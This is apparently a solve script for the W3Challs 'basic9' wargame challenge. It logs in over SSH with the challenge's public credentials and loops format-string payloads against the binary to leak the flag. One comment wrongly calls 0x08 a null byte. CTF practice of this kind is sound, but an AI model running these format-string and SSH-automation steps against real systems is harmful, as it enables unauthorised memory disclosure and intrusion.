#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])

print("[✓] Conectado!")
print("\n[*] Usando environment variable con la dirección 0x0804a060...")

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# La posición 4 tiene algo, vamos a explorarlo mejor
print("\n[*] Explorando posición 4...")

# Poner la dirección en una variable de entorno
cmd = b"ADDR=$'\\x60\\xa0\\x04\\x08' /home/basic9/basic9 '%4$s' 2>&1"
child.sendline(cmd)
child.expect([b'\\$'], timeout=5)

output = child.before
print("Output raw:", output[:200])

# Intentar con diferentes posiciones cercanas
for i in range(1, 10):
    print(f"\n[*] Probando posición {i}...")
    
    cmd = f"ADDR=$'\\x60\\xa0\\x04\\x08' /home/basic9/basic9 '%{i}$s' 2>&1 | cat".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    
    output = child.before
    
    # Buscar W3C
    if b'W3C' in output:
        print(f"\n🔥🔥🔥 FLAG EN POSICIÓN {i} 🔥🔥🔥")
        
        # Decodificar cuidadosamente
        try:
            output_str = output.decode('utf-8', errors='ignore')
        except:
            output_str = output.decode('latin-1', errors='ignore')
        
        # Buscar el patrón
        import re
        match = re.search(r'W3C\{[^\}]*\}', output_str)
        if match:
            print(f"\nFLAG: {match.group(0)}\n")
            break
        else:
            # Buscar manualmente
            start = output_str.find('W3C')
            if start != -1:
                print(f"Flag parcial: {output_str[start:start+50]}")

# Si no funciona con ADDR, probar poniendo la dirección directamente en argv
print("\n[*] Método alternativo: dirección en argv...")

# La dirección 0x0804a060 en little endian es: \x60\xa0\x04\x08
# Pero los nombres de archivo no pueden tener bytes nulos (0x08)

# Intentar con una dirección cercana que no tenga bytes problemáticos
# 0x0804a060 = 134520928 en decimal

# Probar leyendo directamente sin puntero (no debería funcionar pero intentemos)
for i in range(130, 140):
    cmd = f"/home/basic9/basic9 '%{i}$s' 2>&1 | strings -n 10".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    output = child.before
    if b'W3C' in output:
        print(f"\n[!] Encontrado en {i} sin puntero!")
        print(output.decode('utf-8', errors='ignore'))

child.close()
print("\n💀 FIN 💀")